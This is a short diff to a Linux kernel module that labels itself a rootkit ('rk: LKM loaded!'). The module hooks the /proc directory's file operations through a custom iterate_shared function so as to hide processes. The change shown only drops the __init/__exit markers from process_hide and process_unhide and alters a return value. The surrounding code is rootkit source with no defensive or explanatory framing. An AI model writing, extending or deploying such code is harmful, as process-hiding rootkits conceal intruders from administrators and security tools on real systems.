@@ -35,12 +35,12 @@ int rk_iterate_shared(struct file *file, struct dir_context *ctx)
     ctx->pos = rk_ctx.pos;
     return result;
 }
-static int __init process_hide(void)
+static int process_hide(void)
 {
     struct path p;
     printk(KERN_ALERT "rk: LKM loaded!");
     if(kern_path("/proc", 0, &p))
-        return 0;
+        return -1;
     //get the inode
     proc_inode = p.dentry->d_inode;
     //get a copy of fop from inode
@@ -54,7 +54,7 @@ static int __init process_hide(void)
     return 1;
 
 }
-static void __exit process_unhide(void)
+static void process_unhide(void)
 {
     struct path p;
     if (kern_path("/proc", 0,&p))
